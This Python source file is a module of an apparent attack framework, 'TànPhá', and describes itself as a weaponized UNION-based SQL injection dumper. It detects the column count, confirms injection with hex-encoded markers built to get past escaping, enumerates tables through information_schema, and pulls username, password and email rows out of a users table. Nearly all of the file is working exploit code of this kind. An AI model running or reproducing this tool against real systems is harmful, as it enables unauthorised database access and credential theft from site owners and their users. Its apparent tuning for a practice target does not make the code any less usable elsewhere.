#!/usr/bin/env python3
"""TànPhá V5.1 — Weaponized UNION SQLi Dumper (hex-hardened).

Bypass mysqli_real_escape_string via hex literals + backtick identifiers.
Separator: 0x7c7c7c ("|||") — dipilih karena tidak mengandung '<' yang
bikin regex extraction (First name: [^<]+) ke-truncate.

Author: Exelumare
"""
import re
import time
from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urlunparse

from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus


# ============================================================
# Core Dumper — protocol-aware, hex-hardened
# ============================================================
class SQLiDumper:
    OUT_RE = re.compile(r"First name:\s*([^<]+)", re.I)
    ERROR_SIGNS = ("you have an error", "mysqli", "sql syntax", "warning:")

    # separator: "|||" dalam hex, biar nggak ada quote literal & nggak ada '<'
    SEP_HEX = "0x7c7c7c"
    SEP_STR = "|||"
    # pemisah kolom dalam satu baris: "|"
    COL_SEP_HEX = "0x7c"

    def __init__(self, http_client, auth_checker, base_url, param,
                 method="GET", timeout=15, max_cols=8):
        self.http = http_client
        self.auth = auth_checker
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self.max_cols = max_cols
        self.col_count = 0

    # ---------------------------------------------------- payload helpers
    @staticmethod
    def _hex(s):
        return "0x" + s.encode().hex()

    def _post_url(self):
        p = urlparse(self.base_url)
        return urlunparse((p.scheme, p.netloc, p.path, "", "", ""))

    def _get_url(self, payload):
        p = urlparse(self.base_url)
        q = dict(parse_qsl(p.query, keep_blank_values=True))
        q[self.param] = payload
        return urlunparse((p.scheme, p.netloc, p.path, p.params,
                           urlencode(q, safe=""), p.fragment))

    # ---------------------------------------------------------- transport
    def _send(self, payload):
        if self.http is None:
            return None
        try:
            if self.method == "POST":
                res = self.http.request(
                    "POST", self._post_url(),
                    data={self.param: payload, "Submit": "Submit"},
                    headers={"Referer": self.base_url},
                    auth_checker=self.auth,
                    bypass_mutation=True, timeout=self.timeout,
                )
            else:
                res = self.http.request(
                    "GET", self._get_url(payload),
                    target_param=self.param,
                    auth_checker=self.auth,
                    bypass_mutation=True, timeout=self.timeout,
                )
            return res.response if res and res.response is not None else None
        except Exception as e:
            print(f"  [!] send error: {e.__class__.__name__}")
            return None

    def _has_error(self, r):
        if r is None:
            return True
        return any(s in (r.text or "").lower() for s in self.ERROR_SIGNS)

    def _extract(self, r):
        if r is None:
            return None
        m = self.OUT_RE.search(r.text or "")
        return m.group(1).strip() if m else None

    def _split(self, s):
        return [x for x in (s or "").split(self.SEP_STR) if x]

    # ------------------------------------------------- column & injectability
    def detect_columns(self):
        print(f"[*] Column detection ({self.method})...")
        prev_ok = True
        for n in range(1, self.max_cols + 1):
            r = self._send(f"1 ORDER BY {n}-- -")
            ok = not self._has_error(r)
            if prev_ok and not ok:
                self.col_count = n - 1
                print(f"[+] Columns = {self.col_count}")
                return self.col_count
            prev_ok = ok

        for n in range(1, self.max_cols + 1):
            union = ",".join(["NULL"] * n)
            if not self._has_error(self._send(f"-1 UNION SELECT {union}-- -")):
                self.col_count = n
                print(f"[+] Columns = {n} (NULL fallback)")
                return n
        return 0

    def verify_injectable(self):
        marker = "TANPHA" + str(int(time.time()))[-5:]
        cols = ["NULL"] * self.col_count
        cols[0] = self._hex(marker)
        r = self._send(f"-1 UNION SELECT {','.join(cols)}-- -")
        body = (r.text or "") if r else ""
        if marker in body:
            print(f"[+] INJECTABLE — marker '{marker}' muncul di output")
            return True
        if self._hex(marker) in body:
            print("[-] Payload reflected, bukan dieksekusi")
        else:
            print(f"[-] Marker hilang. Snippet: {body[:160]!r}")
        return False

    # ------------------------------------------------------------- dumping
    def _union_expr(self, expr, pos=0):
        cols = ["NULL"] * self.col_count
        cols[pos] = expr
        return self._send(f"-1 UNION SELECT {','.join(cols)}-- -")

    def dump_info(self):
        info = {}
        for k, expr in (("version", "version()"),
                        ("user", "user()"),
                        ("db", "database()")):
            v = self._extract(self._union_expr(expr))
            if v:
                info[k] = v
                print(f"    {k:>7} : {v}")
        return info

    def dump_tables(self):
        expr = (f"(SELECT group_concat(table_name SEPARATOR {self.SEP_HEX}) "
                f"FROM information_schema.tables "
                f"WHERE table_schema=database())")
        v = self._extract(self._union_expr(expr))
        return self._split(v)

    def dump_columns(self, table):
        expr = (f"(SELECT group_concat(column_name SEPARATOR {self.SEP_HEX}) "
                f"FROM information_schema.columns "
                f"WHERE table_schema=database() "
                f"AND table_name={self._hex(table)})")
        v = self._extract(self._union_expr(expr))
        return self._split(v)

    def dump_data(self, table, columns, limit=200):
        col_join = ("concat_ws(" + self.COL_SEP_HEX + ","
                    + ",".join(f"`{c}`" for c in columns) + ")")
        expr = (f"(SELECT group_concat({col_join} SEPARATOR {self.SEP_HEX}) "
                f"FROM `{table}` LIMIT {limit})")
        v = self._extract(self._union_expr(expr))
        return self._split(v)

    # ---------------------------------------------------------------- main
    def run(self):
        if not self.detect_columns():
            return None
        if not self.verify_injectable():
            return None

        info = self.dump_info()
        tables = self.dump_tables()
        print(f"[+] Tables: {tables}")

        target = next((t for t in tables if t.lower() == "users"),
                      tables[0] if tables else None)
        cols, data = [], []
        if target:
            cols = self.dump_columns(target)
            print(f"[+] Columns({target}): {cols}")
            cred = [c for c in cols if c.lower() in
                    ("user", "username", "password", "pass", "email")]
            if cred:
                data = self.dump_data(target, cred)
                print(f"[+] {len(data)} rows dumped:")
                for row in data[:10]:
                    print(f"    {row}")
                if len(data) > 10:
                    print(f"    ... (+{len(data) - 10} more)")

        return {"method": self.method, "param": self.param,
                "info": info, "tables": tables,
                "target": target, "columns": cols, "data": data}


# ============================================================
# Framework Adapter — TànPhá CLI
# ============================================================
class SQLiDumperModule(BaseModule):
    name = "SQLiDumper"
    module_id = "sqli_dump"
    version = "5.1 (hex-hardened)"
    vulnerability_class = "SQL_INJECTION"
    default_impact = "DATABASE_ACCESS"
    default_privilege = "LIMITED"

    COMMON_PARAMS = ["id", "user_id", "uid", "user", "q", "search", "query"]
    MAX_TRIES = 6

    # ------------------------------------------------------ discovery glue
    def _param_candidates(self, context):
        discovered = [p for p in (context.discovery.parameters or [])
                      if p and p.lower() not in ("submit", "answer", "button")]
        url = (context.target.base_url or "").lower()

        if any(hint in url for hint in ("sqli", "sql", "injection")):
            ordered = ["id"]
            for p in self.COMMON_PARAMS:
                if p not in ordered:
                    ordered.append(p)
            for p in discovered:
                if p not in ordered:
                    ordered.append(p)
            return ordered

        ordered = discovered[:]
        for p in self.COMMON_PARAMS:
            if p not in ordered:
                ordered.append(p)
        return ordered

    def _methods(self, context):
        first = (getattr(context.discovery, "form_method", "") or "GET").upper()
        if first not in ("GET", "POST"):
            first = "GET"
        url = (context.target.base_url or "").lower()
        if "sqli" in url and first == "GET":
            return ["POST", "GET"]
        return [first, "POST" if first == "GET" else "GET"]

    def _dumper(self, context, method, param, checker):
        return SQLiDumper(
            http_client=context.http_client,
            auth_checker=checker,
            base_url=context.target.base_url,
            param=param,
            method=method,
        )

    # ------------------------------------------------------ BaseModule API
    def can_run(self, context: TargetContext) -> bool:
        return bool(context.target.base_url)

    def assess(self, context: TargetContext, scope_checker=None):
        print("=== TànPhá SQLi Dumper v5.1 (hex-hardened) ===")
        params = self._param_candidates(context)
        methods = self._methods(context)
        print(f"[*] Trying methods={methods} params={params[:4]}")

        tries = 0
        for method in methods:
            for param in params:
                if tries >= self.MAX_TRIES:
                    break
                tries += 1
                d = self._dumper(context, method, param, scope_checker)
                print(f"  --> try {method} param={param!r}")
                result = d.run()
                if not result:
                    continue

                sample = "\n".join(result["data"][:5])[:1500]
                text = (
                    f"UNION SQLi confirmed via {method} param={param}. "
                    f"DB={result['info'].get('db')} "
                    f"tables={len(result['tables'])} "
                    f"rows={len(result['data'])}.\n{sample}"
                )
                return [Evidence(
                    attempt_id="sqli_dump_union",
                    module_id=self.module_id,
                    module_version=self.version,
                    location=context.target.base_url,
                    parameter=param,
                    outcome="DUMP_SUCCESS",
                    reason_code="UNION_SQLI",
                    reason_detail=text,
                    confidence=0.95,
                    evidence_text=text,
                    assess_payload=f"method={method};param={param};hex UNION",
                    baseline_reference=f"{method}:{param}",
                )]

        print("[-] sqli_dump: semua kombinasi method/param gagal.")
        return []

    def verify(self, context: TargetContext, evidence: Evidence,
               scope_checker=None) -> VerificationResult:
        ref = evidence.baseline_reference or "GET:id"
        try:
            method, param = ref.split(":", 1)
        except ValueError:
            method, param = "GET", evidence.parameter or "id"

        d = self._dumper(context, method, param, scope_checker)
        if d.detect_columns() and d.verify_injectable():
            return VerificationResult(
                status=VerificationStatus.VALIDATED,
                confidence=0.95,
                reason_code="UNION_SQLI_CONFIRMED",
                reason_detail=(
                    f"Marker hex muncul ulang via {method} param={param}; "
                    f"col={d.col_count}"
                ),
                verify_payload=(
                    f"method={method};param={param}; -1 UNION SELECT 0x...-- -"
                ),
            )

        return VerificationResult(
            status=VerificationStatus.REJECTED,
            confidence=0.0,
            reason_code="MARKER_MISSING",
            reason_detail=f"Re-test gagal via {method} param={param}.",
            verify_payload="",
        )

    def exploit(self, context: TargetContext, finding: Finding):
        params = self._param_candidates(context)
        for method in self._methods(context):
            for param in params[:4]:
                res = self._dumper(context, method, param, None).run()
                if res:
                    return res["data"]
        return []
